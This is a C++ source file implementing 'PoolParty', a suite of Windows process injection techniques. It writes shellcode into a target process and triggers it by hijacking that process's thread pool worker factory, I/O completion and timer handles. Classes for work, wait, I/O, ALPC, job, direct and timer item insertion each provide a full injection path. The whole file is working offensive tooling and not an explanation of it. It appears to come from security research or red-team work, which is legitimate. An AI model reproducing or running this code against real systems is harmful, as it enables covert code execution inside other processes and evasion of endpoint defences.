#include "PoolParty.hpp"

std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> g_WideString_Converter;

PoolParty::PoolParty(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: m_dwTargetPid(dwTargetPid), m_cShellcode(cShellcode), m_szShellcodeSize(szShellcodeSize)
{
}

std::shared_ptr<HANDLE> PoolParty::GetTargetProcessHandle() const
{
	auto p_hTargetPid = w_OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, m_dwTargetPid);
	
	return p_hTargetPid;
}

std::shared_ptr<HANDLE> PoolParty::GetTargetThreadPoolWorkerFactoryHandle() const
{
	auto p_hWorkerFactory = HijackWorkerFactoryProcessHandle(m_p_hTargetPid);
	
	return p_hWorkerFactory;
}

std::shared_ptr<HANDLE> PoolParty::GetTargetThreadPoolIoCompletionHandle() const
{
	auto p_hIoCompletion = HijackIoCompletionProcessHandle(m_p_hTargetPid);
	
	return p_hIoCompletion;
}

std::shared_ptr<HANDLE> PoolParty::GetTargetThreadPoolTimerHandle() const
{
	auto p_hTimer = HijackIRTimerProcessHandle(m_p_hTargetPid);
	
	return p_hTimer;
}

WORKER_FACTORY_BASIC_INFORMATION PoolParty::GetWorkerFactoryBasicInformation(HANDLE hWorkerFactory) const
{
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation{ 0 };
	w_NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), nullptr);
	
	return WorkerFactoryInformation;
}

void PoolParty::HijackHandles()
{
}

LPVOID PoolParty::AllocateShellcodeMemory() const
{
	LPVOID ShellcodeAddress = w_VirtualAllocEx(*m_p_hTargetPid, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	return ShellcodeAddress;
}

void PoolParty::WriteShellcode() const
{
	w_WriteProcessMemory(*m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize);
	
}

void PoolParty::Inject()
{
	
	m_p_hTargetPid = this->GetTargetProcessHandle();
	this->HijackHandles();
	m_ShellcodeAddress = this->AllocateShellcodeMemory();
	this->WriteShellcode();
	this->SetupExecution();
	
}

AsynchronousWorkItemInsertion::AsynchronousWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void AsynchronousWorkItemInsertion::HijackHandles()
{
	m_p_hIoCompletion = this->GetTargetThreadPoolIoCompletionHandle();
}

WorkerFactoryStartRoutineOverwrite::WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void WorkerFactoryStartRoutineOverwrite::HijackHandles()
{
	m_p_hWorkerFactory = this->GetTargetThreadPoolWorkerFactoryHandle();
	m_WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation(*m_p_hWorkerFactory);
}

LPVOID WorkerFactoryStartRoutineOverwrite::AllocateShellcodeMemory() const
{
	
	return m_WorkerFactoryInformation.StartRoutine; 
}

void WorkerFactoryStartRoutineOverwrite::SetupExecution() const
{
	ULONG WorkerFactoryMinimumThreadNumber = m_WorkerFactoryInformation.TotalWorkerCount + 1;
	w_NtSetInformationWorkerFactory(*m_p_hWorkerFactory, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
	
}

RemoteTpWorkInsertion::RemoteTpWorkInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteTpWorkInsertion::HijackHandles()
{
	m_p_hWorkerFactory = this->GetTargetThreadPoolWorkerFactoryHandle();
}


void RemoteTpWorkInsertion::SetupExecution() const
{
	auto WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation(*m_p_hWorkerFactory);

	const auto TargetTpPool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, WorkerFactoryInformation.StartParameter);
	

	const auto TargetTaskQueueHighPriorityList = &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;

	const auto pTpWork = w_CreateThreadpoolWork(static_cast<PTP_WORK_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
	

	pTpWork->CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(WorkerFactoryInformation.StartParameter);
	pTpWork->Task.ListEntry.Flink = TargetTaskQueueHighPriorityList;
	pTpWork->Task.ListEntry.Blink = TargetTaskQueueHighPriorityList;
	pTpWork->WorkState.Exchange = 0x2;
	

	const auto pRemoteTpWork = static_cast<PFULL_TP_WORK>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	
	w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK));
	

	auto RemoteWorkItemTaskList = &pRemoteTpWork->Task.ListEntry;
	w_WriteProcessMemory(*m_p_hTargetPid, &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
	w_WriteProcessMemory(*m_p_hTargetPid, &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
	
}

RemoteTpWaitInsertion::RemoteTpWaitInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteTpWaitInsertion::SetupExecution() const
{
	const auto pTpWait = w_CreateThreadpoolWait(static_cast<PTP_WAIT_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
	

	const auto pRemoteTpWait = static_cast<PFULL_TP_WAIT>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	
	w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpWait, pTpWait, sizeof(FULL_TP_WAIT));
	

	const auto pRemoteTpDirect = static_cast<PTP_DIRECT>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	
	w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpDirect, &pTpWait->Direct, sizeof(TP_DIRECT));
	

	const auto p_hEvent = w_CreateEvent(nullptr, FALSE, FALSE, const_cast<LPWSTR>(POOL_PARTY_EVENT_NAME));
	

	w_ZwAssociateWaitCompletionPacket(pTpWait->WaitPkt, *m_p_hIoCompletion, *p_hEvent, pRemoteTpDirect, pRemoteTpWait, 0, 0, nullptr);
	

	w_SetEvent(*p_hEvent);
	
}

RemoteTpIoInsertion::RemoteTpIoInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteTpIoInsertion::SetupExecution() const
{
	const auto p_hFile = w_CreateFile(
		POOL_PARTY_FILE_NAME,
		GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		nullptr, 
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, 
		nullptr);
	

	const auto pTpIo = w_CreateThreadpoolIo(*p_hFile, static_cast<PTP_WIN32_IO_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
	

	/* Not sure why this field is not filled by CreateThreadpoolIo, need to analyze */
	pTpIo->CleanupGroupMember.Callback = m_ShellcodeAddress;

	++pTpIo->PendingIrpCount;
	

	const auto pRemoteTpIo = static_cast<PFULL_TP_IO>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	
	w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO));
	

	IO_STATUS_BLOCK IoStatusBlock{ 0 };
	FILE_COMPLETION_INFORMATION FileIoCopmletionInformation{ 0 };
	FileIoCopmletionInformation.Port = *m_p_hIoCompletion;
	FileIoCopmletionInformation.Key = &pRemoteTpIo->Direct;
	w_ZwSetInformationFile(*p_hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
	

	const std::string Buffer = POOL_PARTY_POEM;
	const auto BufferLength = Buffer.length();
	OVERLAPPED Overlapped{ 0 };
	w_WriteFile(*p_hFile, Buffer.c_str(), BufferLength, nullptr, &Overlapped);
	
}

RemoteTpAlpcInsertion::RemoteTpAlpcInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

// TODO: Add RAII wrappers here for ALPC funcs
void RemoteTpAlpcInsertion::SetupExecution() const
{
	/* We can not re-set the ALPC object IO completion port, so we create a temporary ALPC object that will only be used to allocate a TP_ALPC structure */
	const auto hTempAlpcConnectionPort = w_NtAlpcCreatePort(nullptr, nullptr);
	


	const auto pTpAlpc = w_TpAllocAlpcCompletion(hTempAlpcConnectionPort, static_cast<PTP_ALPC_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
	

	UNICODE_STRING usAlpcPortName = INIT_UNICODE_STRING(POOL_PARTY_ALPC_PORT_NAME);

	OBJECT_ATTRIBUTES AlpcObjectAttributes{ 0 };
	AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	AlpcObjectAttributes.ObjectName = &usAlpcPortName;

	ALPC_PORT_ATTRIBUTES AlpcPortAttributes{ 0 };
	AlpcPortAttributes.Flags = 0x20000;
	AlpcPortAttributes.MaxMessageLength = 328;

	const auto hAlpcConnectionPort = w_NtAlpcCreatePort(&AlpcObjectAttributes, &AlpcPortAttributes);
	
	
	const auto pRemoteTpAlpc = static_cast<PFULL_TP_ALPC>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	
	w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpAlpc, pTpAlpc, sizeof(FULL_TP_ALPC));
	

	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort{ 0 };
	AlpcPortAssociateCopmletionPort.CompletionKey = pRemoteTpAlpc;
	AlpcPortAssociateCopmletionPort.CompletionPort = *m_p_hIoCompletion;
	w_NtAlpcSetInformation(hAlpcConnectionPort, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));
	

	OBJECT_ATTRIBUTES AlpcClientObjectAttributes{ 0 };
	AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

	const std::string Buffer = POOL_PARTY_POEM;
	const auto BufferLength = Buffer.length();

	ALPC_MESSAGE ClientAlpcPortMessage{ 0 };
	ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
	ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
	std::copy(Buffer.begin(), Buffer.end(), ClientAlpcPortMessage.PortMessage);
	auto szClientAlpcPortMessage = sizeof(ClientAlpcPortMessage);

	/* NtAlpcConnectPort would block forever if not used with timeout, we set timeout to 1 second */
	LARGE_INTEGER liTimeout{ 0 };
	liTimeout.QuadPart = -10000000;

	w_NtAlpcConnectPort(
		&usAlpcPortName,
		&AlpcClientObjectAttributes,
		&AlpcPortAttributes,
		0x20000,
		nullptr,
		(PPORT_MESSAGE)&ClientAlpcPortMessage,
		&szClientAlpcPortMessage,
		nullptr,
		nullptr,
		&liTimeout);
	
}

RemoteTpJobInsertion::RemoteTpJobInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteTpJobInsertion::SetupExecution() const
{
	const auto p_hJob = w_CreateJobObject(nullptr, const_cast<LPWSTR>(POOL_PARTY_JOB_NAME));
	

	const auto pTpJob = w_TpAllocJobNotification(*p_hJob, m_ShellcodeAddress, nullptr, nullptr);
	

	const auto RemoteTpJobAddress = static_cast<PFULL_TP_JOB>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	
	w_WriteProcessMemory(*m_p_hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB));
	

	/* SetInformationJobObject does not let directly re-setting object's completion info, but it lets zeroing it out, so we zero it out and then re-set it */
	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort{ 0 };
	w_SetInformationJobObject(*p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
	

	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
	JobAssociateCopmletionPort.CompletionPort = *m_p_hIoCompletion;
	w_SetInformationJobObject(*p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));
	

	w_AssignProcessToJobObject(*p_hJob, GetCurrentProcess());
	
}

RemoteTpDirectInsertion::RemoteTpDirectInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: AsynchronousWorkItemInsertion{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteTpDirectInsertion::SetupExecution() const
{
	TP_DIRECT Direct{ 0 };
	Direct.Callback = m_ShellcodeAddress;
	

	const auto RemoteDirectAddress = static_cast<PTP_DIRECT>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	
	w_WriteProcessMemory(*m_p_hTargetPid, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT));
	

	w_ZwSetIoCompletion(*m_p_hIoCompletion, RemoteDirectAddress, 0, 0, 0);
	
}

RemoteTpTimerInsertion::RemoteTpTimerInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
{
}

void RemoteTpTimerInsertion::HijackHandles()
{
	m_p_hWorkerFactory = this->GetTargetThreadPoolWorkerFactoryHandle();
	m_p_hTimer = this->GetTargetThreadPoolTimerHandle();
}

void RemoteTpTimerInsertion::SetupExecution() const
{
	auto WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation(*m_p_hWorkerFactory);

	const auto pTpTimer = w_CreateThreadpoolTimer(static_cast<PTP_TIMER_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
	

	/* Some changes in the TpTimer requires to know the remote TpTimer address, so first allocate, then perform changes, then write */
	const auto RemoteTpTimerAddress = static_cast<PFULL_TP_TIMER>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	

	const auto Timeout = -10000000;
	pTpTimer->Work.CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(WorkerFactoryInformation.StartParameter);
	pTpTimer->DueTime = Timeout;
	pTpTimer->WindowStartLinks.Key = Timeout;
	pTpTimer->WindowEndLinks.Key = Timeout;
	pTpTimer->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
	pTpTimer->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
	pTpTimer->WindowEndLinks.Children.Blink = &RemoteTpTimerAddress->WindowEndLinks.Children;

	w_WriteProcessMemory(*m_p_hTargetPid, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER));
	
	
	auto TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
	w_WriteProcessMemory(*m_p_hTargetPid, 
		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root,
		reinterpret_cast<PVOID>(&TpTimerWindowStartLinks),
		sizeof(TpTimerWindowStartLinks));

	auto TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
	w_WriteProcessMemory(*m_p_hTargetPid, 
		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, 
		reinterpret_cast<PVOID>(&TpTimerWindowEndLinks),
		sizeof(TpTimerWindowEndLinks));
	

	LARGE_INTEGER ulDueTime{ 0 };
	ulDueTime.QuadPart = Timeout;
	T2_SET_PARAMETERS Parameters{ 0 };
	w_NtSetTimer2(*m_p_hTimer, &ulDueTime, 0, &Parameters);
	
}